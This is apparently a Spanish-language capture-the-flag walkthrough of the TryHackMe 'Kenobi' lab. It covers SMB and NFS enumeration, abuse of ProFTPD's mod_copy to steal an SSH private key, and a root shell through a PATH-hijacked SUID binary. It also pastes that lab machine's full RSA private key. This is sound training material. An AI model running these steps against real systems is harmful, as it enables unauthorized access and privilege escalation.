https://tryhackme.com/room/kenobi

TODAS LAS IPS QUE SE VEN AQUÍ CAMBIAN...

## Checar los puertos abiertos y checar los samba shares

- nmap 10.10.56.240 -vvv   //para ver los puertos abiertos del servidor
- samba se usa para acceder a recursos, printers, etc en internet o intranet
- se puede usar un script de nmap para enumerar los samba shares
- nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.56.240
- se encuentran 3 ( IPC Service, hidden y printer) con acceso de read/write, read/write, none
![image](https://user-images.githubusercontent.com/44788583/149610228-bdc21841-c9af-4b5c-9aa3-729ca0b6c9f3.png)

- Se puede ver que con el share de anonymous el usuario es kenobi

----

## Enumeración de shares y descarga de archivo por smb

- smbclient //10.10.236.140/anonymous
- ls (para ver que hay ahí y encontramos el archivo log.txt)
- smbget -R smb://10.10.236.140/anonymous para bajar el contenido directo
![image](https://user-images.githubusercontent.com/44788583/149610329-98ccf2c5-20c9-49c7-b0d7-2c165d01b6c3.png)
- Si no aplicamos el comando de smbget, entonces hacemos get log.txt
![image](https://user-images.githubusercontent.com/44788583/149610357-e2f22eb5-c2ba-4a24-91bc-ed0fd4bffd89.png)

- en nuestra máquina, podemos ls para ver si está el archivo, debe descargarse en el current working directory cat log.txt para ver que trae el log file
![image](https://user-images.githubusercontent.com/44788583/148824837-9c9a2abc-9706-41e5-aa1f-d50df520dafb.png)

- Se puede ver que es un archivo de samba log y luego dice que es un archivo de configuración de pro FTPD
![image](https://user-images.githubusercontent.com/44788583/149611227-4ce8a3fd-00d5-4b00-97b7-20f880e2f1f7.png)

----

## Enumeración de RPC Bind

- RPC Bind lo que hace es que convierte las remote procedure calls (RPCs) en direcciones universales
- se enumeran con el siguiente comando de nmap: nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.187.207 (el puerto 11 lo pudimos obtener del primer escaneo de nmap)
- vemos el mount var
![image](https://user-images.githubusercontent.com/44788583/149612257-c9827262-a8e8-4e2e-a9a1-76e2e4243d59.png)


## Ganando acceso inicial con ProFTPD

- Del escaneo inicial con nmap podemos ver que la versión que corre de ProFTPD es 1.3.5
- Ahora correremos un escaneo de exploits para esa versión de ProFTPD
![image](https://user-images.githubusercontent.com/44788583/149611745-3d8e585d-b2d3-4b25-8368-438ed04a7ce0.png)

- Se encuentran 3 exploits con el modulo de copy pero si se busca el 1.3.x hay otro, entonces son 4

- En los módulos de copy se dice que se usa el SITE CPFR y SITE CPTO, entonces los podemos usar desde el exploit o de manera manual porque sabemos que este servidor es vulnerable y esos comandos se pueden ejecutar

----

## Moviendo la llave privada de kenobi

- SITE CPFR /home/kenobi/.ssh/id_rsa
- SITE CPTO /var/tmp/id_rsa (Este último es porque le tienes que agregar un archivo como parametro, por es el último de id_rsa) 
- OJO, dentro de la máquina víctima, lo copiamos hacia la carpeta /var porque a esa sí tenemos acceso, está dentro de la carpeta www
![image](https://user-images.githubusercontent.com/44788583/149612421-9bfb6dec-0a7e-476d-bdd8-d14a3b133217.png)

----

## Montando volumen 

- Lo primero que se debe hacer es una carpeta donde montaremos el volumen copiado. La recomendación es crearla adentro de mnt que es donde usualmente se montan los volúmenes nuevos
- sudo mkdir /mnt/kenobi
![image](https://user-images.githubusercontent.com/44788583/149612680-fe046e3b-c937-44da-b42b-54777b4d2374.png)

- checamos que la carpeta exista con ls /mnt
- luego monntamos el volumen con mount 10.10.197.207:/var /tmp/kenobi (la ip de la máquina vulnerada y la carpeta de la misma, después como segundo parámetro en dónde la estamos montando en nuestra máquina
![image](https://user-images.githubusercontent.com/44788583/149612857-c0a24a63-bf3f-4f77-ad79-bdbb78af58e5.png)

- ls -al para checar los permisos que tenemos 
![image](https://user-images.githubusercontent.com/44788583/149612887-af767f3c-7aea-4d73-9d21-dc0b86767a3b.png)

## Usando la llave copiada para acceder al usuario kenobi 
- checamos la carpeta tmp en el folder donde se montó el volumen con ls /mnt/kenobi/tmp
![image](https://user-images.githubusercontent.com/44788583/149613004-3c21a7c3-4325-4b9c-85f8-efd917eca065.png)
- copiamos el archivo al current working directory con sudo cp /mnt/kenobi/tmp/id_rsa .   (el puntito es para que se copie donde estamos, en el current working directory)
![image](https://user-images.githubusercontent.com/44788583/149613078-708cb6a9-043f-41b5-98cf-d211d883614d.png)
- cambiamos los permisos   para que sólo nosotros podamos modificar y no nos diga warning
- sudo chmod 0400 id_rsa
- Esto evitará lo siguiente: 

![image](https://user-images.githubusercontent.com/44788583/149634256-ce4c8a2b-10ad-4c35-920f-9fedc4ddfcbf.png)

Te dejo la llave privada por si así como yo interrumpes tu jornada de trabajo pero ya encontraste la llave de kenobi y no quieres empezar de cero. Le tendrás que agregar de nuevo permisos 0400

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA4PeD0e0522UEj7xlrLmN68R6iSG3HMK/aTI812CTtzM9gnXs
qpweZL+GJBB59bSG3RTPtirC3M9YNTDsuTvxw9Y/+NuUGJIq5laQZS5e2RaqI1nv
U7fXEQlJrrlWfCy9VDTlgB/KRxKerqc42aU+/BrSyYqImpN6AgoNm/s/753DEPJt
dwsr45KFJOhtaIPA4EoZAq8pKovdSFteeUHikosUQzgqvSCv1RH8ZYBTwslxSorW
y3fXs5GwjitvRnQEVTO/GZomGV8UhjrT3TKbPhiwOy5YA484Lp3ES0uxKJEnKdSt
otHFT4i1hXq6T0CvYoaEpL7zCq7udl7KcZ0zfwIDAQABAoIBAEDl5nc28kviVnCI
ruQnG1P6eEb7HPIFFGbqgTa4u6RL+eCa2E1XgEUcIzxgLG6/R3CbwlgQ+entPssJ
dCDztAkE06uc3JpCAHI2Yq1ttRr3ONm95hbGoBpgDYuEF/j2hx+1qsdNZHMgYfqM
bxAKZaMgsdJGTqYZCUdxUv++eXFMDTTw/h2SCAuPE2Nb1f1537w/UQbB5HwZfVry
tRHknh1hfcjh4ZD5x5Bta/THjjsZo1kb/UuX41TKDFE/6+Eq+G9AvWNC2LJ6My36
YfeRs89A1Pc2XD08LoglPxzR7Hox36VOGD+95STWsBViMlk2lJ5IzU9XVIt3EnCl
bUI7DNECgYEA8ZymxvRV7yvDHHLjw5Vj/puVIQnKtadmE9H9UtfGV8gI/NddE66e
t8uIhiydcxE/u8DZd+mPt1RMU9GeUT5WxZ8MpO0UPVPIRiSBHnyu+0tolZSLqVul
rwT/nMDCJGQNaSOb2kq+Y3DJBHhlOeTsxAi2YEwrK9hPFQ5btlQichMCgYEA7l0c
dd1mwrjZ51lWWXvQzOH0PZH/diqXiTgwD6F1sUYPAc4qZ79blloeIhrVIj+isvtq
mgG2GD0TWueNnddGafwIp3USIxZOcw+e5hHmxy0KHpqstbPZc99IUQ5UBQHZYCvl
SR+ANdNuWpRTD6gWeVqNVni9wXjKhiKM17p3RmUCgYEAp6dwAvZg+wl+5irC6WCs
dmw3WymUQ+DY8D/ybJ3Vv+vKcMhwicvNzvOo1JH433PEqd/0B0VGuIwCOtdl6DI9
u/vVpkvsk3Gjsyh5gFI8iZuWAtWE5Av4OC5bwMXw8ZeLxr0y1JKw8ge9NSDl/Pph
YNY61y+DdXUvywifkzFmhYkCgYB6TeZbh9XBVg3gyhMnaQNzDQFAUlhM7n/Alcb7
TjJQWo06tOlHQIWi+Ox7PV9c6l/2DFDfYr9nYnc67pLYiWwE16AtJEHBJSHtofc7
P7Y1PqPxnhW+SeDqtoepp3tu8kryMLO+OF6Vv73g1jhkUS/u5oqc8ukSi4MHHlU8
H94xjQKBgExhzreYXCjK9FswXhUU9avijJkoAsSbIybRzq1YnX0gSewY/SB2xPjF
S40wzYviRHr/h0TOOzXzX8VMAQx5XnhZ5C/WMhb0cMErK8z+jvDavEpkMUlR+dWf
Py/CLlDCU4e+49XBAPKEmY4DuN+J2Em/tCz7dzfCNS/mpsSEn0jo
-----END RSA PRIVATE KEY-----

----

## Ingresando como kenobi en ssh por id_rsa
- se pone la el protocolo, el archivo de llave privada, el usuario y la ip
- sudo ssh -i id_rsa kenobi@10.10.187.207
![image](https://user-images.githubusercontent.com/44788583/149613275-47f1cca1-35cd-4e91-acef-5d70395151bb.png)
tamos dentro!
- Buscamos la flag que nos dicen que busquemos en la carpeta kenobi 
![image](https://user-images.githubusercontent.com/44788583/149613327-bcbada8f-468f-4027-94d3-5e0e185798a7.png)

------

## Enumerando archivos que tienen el SUID bit en ellos:
![image](https://user-images.githubusercontent.com/44788583/149634828-0d627916-8bd3-466b-91e7-1fd78d2a1124.png)

- Se ejecuta el siguiente comando: find / -perm -u=s -type f 2>/dev/null

![image](https://user-images.githubusercontent.com/44788583/149634846-810c4f11-256a-44aa-988d-5185adf1b79e.png)
- Se nos pide que encontremos un binario fuera de lo normal, en este caso es usr/bin/menu
- si ejecutamos con el comando: menu, obtenemos lo siguiente
![image](https://user-images.githubusercontent.com/44788583/149634917-6948229e-4917-4a6f-8cb3-e3818b823236.png)

## Haciendo ingeniería inversa para escalar privilegios

- Se buscan las strings en ese binario y se encuentran en parte las siguientes

![image](https://user-images.githubusercontent.com/44788583/149635287-c31fac73-304e-491a-8909-14ca7ed44948.png)

Algo que dice el reto es que notemos que se ejecuta todo sin el path completo, eso quiere decir que el path está en las variables del sistema.

- Podemos checar las variables de entorno del usuario con el comando: env
![image](https://user-images.githubusercontent.com/44788583/149635401-2dbad6a2-9164-4985-9703-fba51bab5259.png)

-----

## Exportando path para poder ganar root shell con /bin/sh
antes de esto, necesitamos saber que es una /bin/sh
![image](https://user-images.githubusercontent.com/44788583/149635909-422c4900-cfc9-4f1b-a3d9-60a800c93c8d.png)
Aquí se puede ver un poco de eso: 
https://medium.com/@codingmaths/bin-bash-what-exactly-is-this-95fc8db817bf#:~:text=%2Fbin%2Fsh%20is%20an%20executable,shell%20is%20the%20system%20shell.&text=In%20last%20couple%20of%20years,but%20lighter%20and%20much%20faster.
Prácticamente es un shell, lo que queremos hacer entonces es ejecutar una shell, lo que haremos será hacer que se mande a llamar una shell desde una de los strings que utiliza nuestro binario. En este caso, nos aprovecharemos de la instrucción curl que se encuentra dentro de nuestras strigns y que sabemos que es la que utiliza el menu en su opción 1 que es el status check

Se sabe que el binario de /usr/bin/menu se ejecuta como usuario root, entonces podemos aprovechar eso
![image](https://user-images.githubusercontent.com/44788583/149635765-2351829d-82d8-4893-b477-b7e115e775e6.png)

- echo /bin/sh > curl
- chmod 777 curl
- export PATH=/tmp:$PATH

![image](https://user-images.githubusercontent.com/44788583/149635846-8f5c43a6-9ca4-4adb-b604-72bf5ba4e860.png)
Lo que se hizo fue copiar la /bin/sh shell y

We copied the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path. This meant that when the /usr/bin/menu binary was run, its using our path variable to find the "curl" binary.. Which is actually a version of /usr/sh, as well as this file being run as root it runs our shell as root!


